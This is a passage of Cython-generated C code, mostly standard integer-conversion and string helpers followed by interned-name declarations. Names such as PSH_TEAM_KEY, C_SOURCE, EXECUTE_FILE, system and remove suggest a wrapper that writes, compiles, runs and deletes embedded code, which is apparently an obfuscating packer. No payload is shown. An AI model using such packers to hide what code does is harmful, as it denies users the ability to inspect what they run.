__PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))\n#endif\n            }\n        }\n        {\n#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)\n            PyErr_SetString(PyExc_RuntimeError,\n                            \"_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers\");\n#else""\n            long val;\n            PyObject *v = __Pyx_PyNumber_IntOrLong(x);\n #if PY_MAJOR_VERSION < 3\n            if (likely(v) && !PyLong_Check(v)) {\n                PyObject *tmp = v;\n                v = PyNumber_Long(tmp);\n                Py_DECREF(tmp);\n            }\n #endif\n            if (likely(v)) {\n                int one = 1; int is_little = (int)*(unsigned char *)&one;\n                unsigned char *bytes = (unsigned char *)&val;\n                int ret = _PyLong_AsByteArray((PyLongObject *)v,\n                                              bytes, sizeof(val),\n                                              is_little, !is_unsigned);\n                Py_DECREF(v);\n                if (likely(!ret))\n                    return val;\n            }\n#endif\n            return (long) -1;\n        }\n    } else {\n        long val;\n        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);\n        if (!tmp) return (long) -1;\n        val = __Pyx_PyInt_As_long(tmp);\n        Py_DECREF(tmp);\n        return val;\n    }\nraise_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        \"value too large to convert to long\");\n    return (long) -1;\nraise_neg_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        \"can't convert negative value to long\");\n    return (long) -1;\n}\n\n/* CIntFromPy */\n    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wconversion\"\n#endif\n    const int neg_one = (int) -1, const_zero = (int) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n#if PY_MAJOR_VERSION < 3\n    if (likely(PyInt_Check(x))) {\n        if (sizeof(int) < sizeof(long)) {\n            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))\n        } else {\n            long val = PyInt_AS_LONG(x);\n            if (is_unsigned && unlikely(val < 0)) {\n                ""goto raise_neg_overflow;\n            }\n            return (int) val;\n        }\n    } else\n#endif\n    if (likely(PyLong_Check(x))) {\n        if (is_unsigned) {\n#if CYTHON_USE_PYLONG_INTERNALS\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\n            switch (Py_SIZE(x)) {\n                case  0: return (int) 0;\n                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])\n                case 2:\n                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {\n                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n                case 3:\n                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {\n                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n                case 4:\n                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyL""ong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {\n                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n            }\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON\n            if (unlikely(Py_SIZE(x) < 0)) {\n                goto raise_neg_overflow;\n            }\n#else\n            {\n                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\n                if (unlikely(result < 0))\n                    return (int) -1;\n                if (unlikely(result == 1))\n                    goto raise_neg_overflow;\n            }\n#endif\n            if (sizeof(int) <= sizeof(unsigned long)) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\n#endif\n            }\n        } else {\n#if CYTHON_USE_PYLONG_INTERNALS\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\n            switch (Py_SIZE(x)) {\n                case  0: return (int) 0;\n                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))\n                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])\n                case -2:\n                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\n                            return (int) (((int)-1)*((""(((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case 2:\n                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\n                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case -3:\n                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\n                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case 3:\n                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\n                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                  ""  }\n                    break;\n                case -4:\n                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {\n                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case 4:\n                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {\n                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n            }\n#endif\n            if (sizeof(int) <= sizeof(long)) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))\n#endif\n            }\n        }\n        {\n#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)\n            PyErr_SetString(PyExc_RuntimeError,""\n                            \"_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers\");\n#else\n            int val;\n            PyObject *v = __Pyx_PyNumber_IntOrLong(x);\n #if PY_MAJOR_VERSION < 3\n            if (likely(v) && !PyLong_Check(v)) {\n                PyObject *tmp = v;\n                v = PyNumber_Long(tmp);\n                Py_DECREF(tmp);\n            }\n #endif\n            if (likely(v)) {\n                int one = 1; int is_little = (int)*(unsigned char *)&one;\n                unsigned char *bytes = (unsigned char *)&val;\n                int ret = _PyLong_AsByteArray((PyLongObject *)v,\n                                              bytes, sizeof(val),\n                                              is_little, !is_unsigned);\n                Py_DECREF(v);\n                if (likely(!ret))\n                    return val;\n            }\n#endif\n            return (int) -1;\n        }\n    } else {\n        int val;\n        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);\n        if (!tmp) return (int) -1;\n        val = __Pyx_PyInt_As_int(tmp);\n        Py_DECREF(tmp);\n        return val;\n    }\nraise_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        \"value too large to convert to int\");\n    return (int) -1;\nraise_neg_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        \"can't convert negative value to int\");\n    return (int) -1;\n}\n\n/* FastTypeChecks */\n    #if CYTHON_COMPILING_IN_CPYTHON\nstatic int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {\n    while (a) {\n        a = a->tp_base;\n        if (a == b)\n            return 1;\n    }\n    return b == &PyBaseObject_Type;\n}\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {\n    PyObject *mro;\n    if (a == b) return 1;\n    mro = a->tp_mro;\n    if (likely(mro)) {\n        Py_ssize_t i, n;\n        n = PyTuple_GET_SIZE(mro);\n        for (i = 0; i < n; i++) {\n            if (PyTuple_GET_ITEM(mro, i) == (PyO""bject *)b)\n                return 1;\n        }\n        return 0;\n    }\n    return __Pyx_InBases(a, b);\n}\n#if PY_MAJOR_VERSION == 2\nstatic int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {\n    PyObject *exception, *value, *tb;\n    int res;\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ErrFetch(&exception, &value, &tb);\n    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;\n    if (unlikely(res == -1)) {\n        PyErr_WriteUnraisable(err);\n        res = 0;\n    }\n    if (!res) {\n        res = PyObject_IsSubclass(err, exc_type2);\n        if (unlikely(res == -1)) {\n            PyErr_WriteUnraisable(err);\n            res = 0;\n        }\n    }\n    __Pyx_ErrRestore(exception, value, tb);\n    return res;\n}\n#else\nstatic CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {\n    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;\n    if (!res) {\n        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);\n    }\n    return res;\n}\n#endif\nstatic int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {\n    Py_ssize_t i, n;\n    assert(PyExceptionClass_Check(exc_type));\n    n = PyTuple_GET_SIZE(tuple);\n#if PY_MAJOR_VERSION >= 3\n    for (i=0; i<n; i++) {\n        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;\n    }\n#endif\n    for (i=0; i<n; i++) {\n        PyObject *t = PyTuple_GET_ITEM(tuple, i);\n        #if PY_MAJOR_VERSION < 3\n        if (likely(exc_type == t)) return 1;\n        #endif\n        if (likely(PyExceptionClass_Check(t))) {\n            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;\n        } else {\n        }\n    }\n    return 0;\n}\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {\n    if (likely(err == exc_type)"") return 1;\n    if (likely(PyExceptionClass_Check(err))) {\n        if (likely(PyExceptionClass_Check(exc_type))) {\n            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);\n        } else if (likely(PyTuple_Check(exc_type))) {\n            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);\n        } else {\n        }\n    }\n    return PyErr_GivenExceptionMatches(err, exc_type);\n}\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {\n    assert(PyExceptionClass_Check(exc_type1));\n    assert(PyExceptionClass_Check(exc_type2));\n    if (likely(err == exc_type1 || err == exc_type2)) return 1;\n    if (likely(PyExceptionClass_Check(err))) {\n        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);\n    }\n    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));\n}\n#endif\n\n/* CheckBinaryVersion */\n    static int __Pyx_check_binary_version(void) {\n    char ctversion[5];\n    int same=1, i, found_dot;\n    const char* rt_from_call = Py_GetVersion();\n    PyOS_snprintf(ctversion, 5, \"%d.%d\", PY_MAJOR_VERSION, PY_MINOR_VERSION);\n    found_dot = 0;\n    for (i = 0; i < 4; i++) {\n        if (!ctversion[i]) {\n            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');\n            break;\n        }\n        if (rt_from_call[i] != ctversion[i]) {\n            same = 0;\n            break;\n        }\n    }\n    if (!same) {\n        char rtversion[5] = {'\\0'};\n        char message[200];\n        for (i=0; i<4; ++i) {\n            if (rt_from_call[i] == '.') {\n                if (found_dot) break;\n                found_dot = 1;\n            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {\n                break;\n            }\n            rtversion[i] = rt_from_call[i];\n        }\n        PyOS_snprintf(message, sizeof(message),\n                      \"compiletim""e version %s of module '%.100s' \"\n                      \"does not match runtime version %s\",\n                      ctversion, __Pyx_MODULE_NAME, rtversion);\n        return PyErr_WarnEx(NULL, message, 1);\n    }\n    return 0;\n}\n\n/* InitStrings */\n    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {\n    while (t->p) {\n        #if PY_MAJOR_VERSION < 3\n        if (t->is_unicode) {\n            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);\n        } else if (t->intern) {\n            *t->p = PyString_InternFromString(t->s);\n        } else {\n            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);\n        }\n        #else\n        if (t->is_unicode | t->is_str) {\n            if (t->intern) {\n                *t->p = PyUnicode_InternFromString(t->s);\n            } else if (t->encoding) {\n                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);\n            } else {\n                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);\n            }\n        } else {\n            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);\n        }\n        #endif\n        if (!*t->p)\n            return -1;\n        if (PyObject_Hash(*t->p) == -1)\n            return -1;\n        ++t;\n    }\n    return 0;\n}\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {\n    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));\n}\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {\n    Py_ssize_t ignore;\n    return __Pyx_PyObject_AsStringAndSize(o, &ignore);\n}\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\n#if !CYTHON_PEP393_ENABLED\nstatic const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n    char* defenc_c;\n    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);\n    if (!defenc) return NULL;\n    defenc_c = PyBytes_AS_STRING(defenc);\n#if __PYX_DEFAULT_STRING_ENCODING_IS""_ASCII\n    {\n        char* end = defenc_c + PyBytes_GET_SIZE(defenc);\n        char* c;\n        for (c = defenc_c; c < end; c++) {\n            if ((unsigned char) (*c) >= 128) {\n                PyUnicode_AsASCIIString(o);\n                return NULL;\n            }\n        }\n    }\n#endif\n    *length = PyBytes_GET_SIZE(defenc);\n    return defenc_c;\n}\n#else\nstatic CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n    if (likely(PyUnicode_IS_ASCII(o))) {\n        *length = PyUnicode_GET_LENGTH(o);\n        return PyUnicode_AsUTF8(o);\n    } else {\n        PyUnicode_AsASCIIString(o);\n        return NULL;\n    }\n#else\n    return PyUnicode_AsUTF8AndSize(o, length);\n#endif\n}\n#endif\n#endif\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\n    if (\n#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n            __Pyx_sys_getdefaultencoding_not_ascii &&\n#endif\n            PyUnicode_Check(o)) {\n        return __Pyx_PyUnicode_AsStringAndSize(o, length);\n    } else\n#endif\n#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))\n    if (PyByteArray_Check(o)) {\n        *length = PyByteArray_GET_SIZE(o);\n        return PyByteArray_AS_STRING(o);\n    } else\n#endif\n    {\n        char* result;\n        int r = PyBytes_AsStringAndSize(o, &result, length);\n        if (unlikely(r < 0)) {\n            return NULL;\n        } else {\n            return result;\n        }\n    }\n}\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {\n   int is_true = x == Py_True;\n   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;\n   else return PyObject_IsTrue(x);\n}\nstatic CYTHON_INLINE int __Pyx""_PyObject_IsTrueAndDecref(PyObject* x) {\n    int retval;\n    if (unlikely(!x)) return -1;\n    retval = __Pyx_PyObject_IsTrue(x);\n    Py_DECREF(x);\n    return retval;\n}\nstatic PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {\n#if PY_MAJOR_VERSION >= 3\n    if (PyLong_Check(result)) {\n        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\n                \"__int__ returned non-int (type %.200s).  \"\n                \"The ability to return an instance of a strict subclass of int \"\n                \"is deprecated, and may be removed in a future version of Python.\",\n                Py_TYPE(result)->tp_name)) {\n            Py_DECREF(result);\n            return NULL;\n        }\n        return result;\n    }\n#endif\n    PyErr_Format(PyExc_TypeError,\n                 \"__%.4s__ returned non-%.4s (type %.200s)\",\n                 type_name, type_name, Py_TYPE(result)->tp_name);\n    Py_DECREF(result);\n    return NULL;\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {\n#if CYTHON_USE_TYPE_SLOTS\n  PyNumberMethods *m;\n#endif\n  const char *name = NULL;\n  PyObject *res = NULL;\n#if PY_MAJOR_VERSION < 3\n  if (likely(PyInt_Check(x) || PyLong_Check(x)))\n#else\n  if (likely(PyLong_Check(x)))\n#endif\n    return __Pyx_NewRef(x);\n#if CYTHON_USE_TYPE_SLOTS\n  m = Py_TYPE(x)->tp_as_number;\n  #if PY_MAJOR_VERSION < 3\n  if (m && m->nb_int) {\n    name = \"int\";\n    res = m->nb_int(x);\n  }\n  else if (m && m->nb_long) {\n    name = \"long\";\n    res = m->nb_long(x);\n  }\n  #else\n  if (likely(m && m->nb_int)) {\n    name = \"int\";\n    res = m->nb_int(x);\n  }\n  #endif\n#else\n  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {\n    res = PyNumber_Int(x);\n  }\n#endif\n  if (likely(res)) {\n#if PY_MAJOR_VERSION < 3\n    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {\n#else\n    if (unlikely(!PyLong_CheckExact(res))) {\n#endif\n        return __Pyx_PyNumber_IntOrLongW""rongResultType(res, name);\n    }\n  }\n  else if (!PyErr_Occurred()) {\n    PyErr_SetString(PyExc_TypeError,\n                    \"an integer is required\");\n  }\n  return res;\n}\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {\n  Py_ssize_t ival;\n  PyObject *x;\n#if PY_MAJOR_VERSION < 3\n  if (likely(PyInt_CheckExact(b))) {\n    if (sizeof(Py_ssize_t) >= sizeof(long))\n        return PyInt_AS_LONG(b);\n    else\n        return PyInt_AsSsize_t(b);\n  }\n#endif\n  if (likely(PyLong_CheckExact(b))) {\n    #if CYTHON_USE_PYLONG_INTERNALS\n    const digit* digits = ((PyLongObject*)b)->ob_digit;\n    const Py_ssize_t size = Py_SIZE(b);\n    if (likely(__Pyx_sst_abs(size) <= 1)) {\n        ival = likely(size) ? digits[0] : 0;\n        if (size == -1) ival = -ival;\n        return ival;\n    } else {\n      switch (size) {\n         case 2:\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -2:\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case 3:\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -3:\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case 4:\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLon""g_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -4:\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n      }\n    }\n    #endif\n    return PyLong_AsSsize_t(b);\n  }\n  x = PyNumber_Index(b);\n  if (!x) return -1;\n  ival = PyInt_AsSsize_t(x);\n  Py_DECREF(x);\n  return ival;\n}\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {\n  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {\n    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);\n#if PY_MAJOR_VERSION < 3\n  } else if (likely(PyInt_CheckExact(o))) {\n    return PyInt_AS_LONG(o);\n#endif\n  } else {\n    Py_ssize_t ival;\n    PyObject *x;\n    x = PyNumber_Index(o);\n    if (!x) return -1;\n    ival = PyInt_AsLong(x);\n    Py_DECREF(x);\n    return ival;\n  }\n}\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {\n  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);\n}\nstatic CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {\n    return PyInt_FromSize_t(ival);\n}\n\n\n#endif /* Py_PYTHON_H */";
      static PyObject *__pyx_n_s_COMPILE_FILE;
      static PyObject *__pyx_n_s_C_FILE;
      static PyObject *__pyx_n_s_C_SOURCE;
      static PyObject *__pyx_n_s_EXECUTE_FILE;
      static PyObject *__pyx_n_s_EXPORT_PYTHONHOME;
      static PyObject *__pyx_n_s_EXPORT_PYTHON_EXECUTABLE;
      static PyObject *__pyx_n_s_PREFIX;
      static PyObject *__pyx_n_s_PSH_TEAM_KEY;
      static PyObject *__pyx_n_s_PYTHON_VERSION;
      static PyObject *__pyx_n_s_RUN;
      static PyObject *__pyx_n_s_cline_in_traceback;
      static PyObject *__pyx_n_s_dirname;
      static PyObject *__pyx_n_s_enter;
      static PyObject *__pyx_n_s_executable;
      static PyObject *__pyx_n_s_exist_ok;
      static PyObject *__pyx_n_s_exit;
      static PyObject *__pyx_n_s_exit_2;
      static PyObject *__pyx_n_s_f;
      static PyObject *__pyx_kp_u_ifndef_PY_SSIZE_T_CLEAN_define;
      static PyObject *__pyx_n_s_import;
      static PyObject *__pyx_n_s_isfile;
      static PyObject *__pyx_n_s_main;
      static PyObject *__pyx_n_s_makedirs;
      static PyObject *__pyx_n_s_name;
      static PyObject *__pyx_n_s_open;
      static PyObject *__pyx_n_s_os;
      static PyObject *__pyx_n_s_path;
      static PyObject *__pyx_n_s_prefix;
      static PyObject *__pyx_n_s_remove;
      static PyObject *__pyx_n_s_split;
      static PyObject *__pyx_n_s_sys;
      static PyObject *__pyx_n_s_system;
      static PyObject *__pyx_n_s_test;
      static PyObject *__pyx_n_s_version;
      static PyObject *__pyx_n_s_write;
static PyObject *__pyx_int_0;
static PyObject *__pyx_int_32;
static PyObject *__pyx_int_38;
static PyObject *__pyx_int_45;
static PyObject *__pyx_int_46;
static PyObject *__pyx_int_47;
static PyObject *__pyx_int_48;
static PyObject *__pyx_int_49;
static PyObject *__pyx_int_50;
static PyObject *__pyx_int_51;
static PyObject *__pyx_int_52;
static PyObject *__pyx_int_53;
static PyObject *__pyx_int_54;
static PyObject *__pyx_int_55;
static PyObject *__pyx_int_61;
static PyObject *__pyx_int_65;
static PyObject *__pyx_int_66;
static PyObject *__pyx_int_67;
static PyObject *__pyx_int_69;
static PyObject *__pyx_int_72;
static PyObject *__pyx_int_73;
static PyObject *__pyx_int_76;
static PyObject *__pyx_int_77;
static PyObject *__pyx_int_78;
static PyObject *__pyx_int_79;
static PyObject *__pyx_int_80;
static PyObject *__pyx_int_82;
static PyObject *__pyx_int_84;
static PyObject *__pyx_int_85;
static PyObject *__pyx_int_86;
static PyObject *__pyx_int_88;
static PyObject *__pyx_int_89;
static PyObject *__pyx_int_95;
static PyObject *__pyx_int_97;
static PyObject *__pyx_int_98;
static PyObject *__pyx_int_99;
static PyObject *__pyx_int_100;
static PyObject *__pyx_int_101;
static PyObject *__pyx_int_103;
static PyObject *__pyx_int_104;
static PyObject *__pyx_int_105;
static PyObject *__pyx_int_108;
static PyObject *__pyx_int_110;
static PyObject *__pyx_int_111;
static PyObject *__pyx_int_112;
static PyObject *__pyx_int_114;
static PyObject *__pyx_int_116;
static PyObject *__pyx_int_117;
static PyObject *__pyx_int_118;
static PyObject *__pyx_int_119;
static PyObject *__pyx_int_120;
static PyObject *__pyx_int_121;
static PyObject *__pyx_int_128;
static PyObject *__pyx_int_145;
static PyObject *__pyx_int_159;
static PyObject *__pyx_int_168;
static PyObject *__pyx_int_174;
static PyObject *__pyx_int_216;
static PyObject *__pyx_int_240;
static PyObject *__pyx_int_neg_1;
static PyObject *__pyx_tuple_;
static PyObject *__pyx_slice__2;
static PyObject *__pyx_tuple__3;
/* Late includes */

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_source(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_source},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "source",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
